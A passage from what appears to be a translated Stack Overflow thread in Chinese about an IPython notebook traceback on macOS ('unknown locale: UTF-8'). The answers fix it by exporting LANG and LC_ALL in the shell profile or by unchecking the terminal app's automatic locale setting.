  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/config/application.py", line 84, in catch_config_error
    return method(app, *args, **kwargs)
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/core/application.py", line 325, in initialize
    self.parse_command_line(argv)
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/frontend/terminal/ipapp.py", line 308, in parse_command_line
    return super(TerminalIPythonApp, self).parse_command_line(argv)
  File "<string>", line 2, in parse_command_line
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/config/application.py", line 84, in catch_config_error
    return method(app, *args, **kwargs)
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/config/application.py", line 420, in parse_command_line
    return self.initialize_subcommand(subc, subargv)
  File "<string>", line 2, in initialize_subcommand
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/config/application.py", line 84, in catch_config_error
    return method(app, *args, **kwargs)
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/config/application.py", line 352, in initialize_subcommand
    subapp = import_item(subapp)
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/utils/importstring.py", line 40, in import_item
    module = __import__(package,fromlist=[obj])
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/frontend/html/notebook/notebookapp.py", line 46, in <module>
    from .handlers import (LoginHandler, LogoutHandler,
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/IPython/frontend/html/notebook/handlers.py", line 36, in <module>
    from docutils.core import publish_string
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/docutils/core.py", line 20, in <module>
    from docutils import frontend, io, utils, readers, writers
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/docutils/frontend.py", line 41, in <module>
    import docutils.utils
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/docutils/utils/__init__.py", line 20, in <module>
    from docutils.io import FileOutput
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/docutils/io.py", line 18, in <module>
    from docutils.utils.error_reporting import locale_encoding, ErrorString, ErrorOutput
  File "/Users/millerc/anaconda/lib/python2.7/site-packages/docutils/utils/error_reporting.py", line 47, in <module>
    locale_encoding = locale.getlocale()[1] or locale.getdefaultlocale()[1]
  File "/Users/millerc/anaconda/lib/python2.7/locale.py", line 503, in getdefaultlocale
    return _parse_localename(localename)
  File "/Users/millerc/anaconda/lib/python2.7/locale.py", line 435, in _parse_localename
    raise ValueError, 'unknown locale: %s' % localename
ValueError: unknown locale: UTF-8 
```

从终端运行`locale`命令：

```
5-millerc-~:locale 
LANG=
LC_COLLATE="C"
LC_CTYPE="UTF-8"
LC_MESSAGES="C"
LC_MONETARY="C"
LC_NUMERIC="C"
LC_TIME="C"
LC_ALL= 
```

* * *

## 回答 #1

> 赞同：100
> 
> 时间：2013-03-23T19:16:23.813

我在这里总结了解决方案：[http ://blog.lobraun.de/2009/04/11/mercurial-on-mac-os-x-valueerror-unknown-locale-utf-8/](http://blog.lobraun.de/2009/04/11/mercurial-on-mac-os-x-valueerror-unknown-locale-utf-8/)

我将这些行添加到我的`.bash_profile`：

```
export LC_ALL=en_US.UTF-8
export LANG=en_US.UTF-8 
```

我重新加载了配置文件：

```
source ~/.bash_profile 
```

然后我又跑`ipython`了：

```
ipython notebook 
```

## 更改语言环境

以上将适用于美国语言环境中的英语。可能需要不同的设置。

冒着明显的风险，要发现系统的当前设置，请使用：

```
$ locale 
```

并检索系统上所有有效设置的列表：

```
$ locale -a 
```

然后选择您喜欢的语言环境。例如，对于瑞士法语语言环境，解决方案如下所示：

```
export LC_ALL=fr_CH.UTF-8
export LANG=fr_CH.UTF-8 
```

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2013-11-15T01:11:23.683

这是 OS X 终端应用程序中的一个错误，仅在某些区域设置（国家/语言组合）中出现。在 /Applications/Utilities 中打开终端并取消选中“启动时设置区域环境变量”框。

[![在此处输入图像描述](../Images/4a2b1fd30f453c186dfc83e84a390e05.png)](https://i.stack.imgur.com/EwOj7.jpg)

这会将您的`LANG`环境变量设置为空。这可能会导致终端使用不正确的区域设置。终端中的 locale 命令将告诉您使用了哪些设置。要使用正确的语言，请在 bash 配置文件中添加一行（通常为`~/.profile`）

```
export LANG=your-lang 
```

替换`your-lang`为您的语言的正确语言环境说明符。该命令`locale -a`将向您显示所有说明符。例如，美国英语的语言代码是`en_US.UTF-8`. 语言环境会影响可用时使用的翻译，以及日期、货币和小数的格式。

请注意，此图像和内容取自[http://conda.pydata.org/docs/troubleshooting.html#unknown-locale](http://conda.pydata.org/docs/troubleshooting.html#unknown-locale)（我也是该页面的原作者）。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2014-02-03T08:16:40.743

在 iTerm 中进入菜单

```
Preferences -> Profiles -> Terminal -> (Environment) 
```

然后取消选中

```
"Set locale variables automatically" 
```

使这个错误消失了。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-03-24T13:39:22.650

由于您`LC_CTYPE`的错误，您应该找出错误值的设置位置并将其更改为类似`en_US.UTF-8`.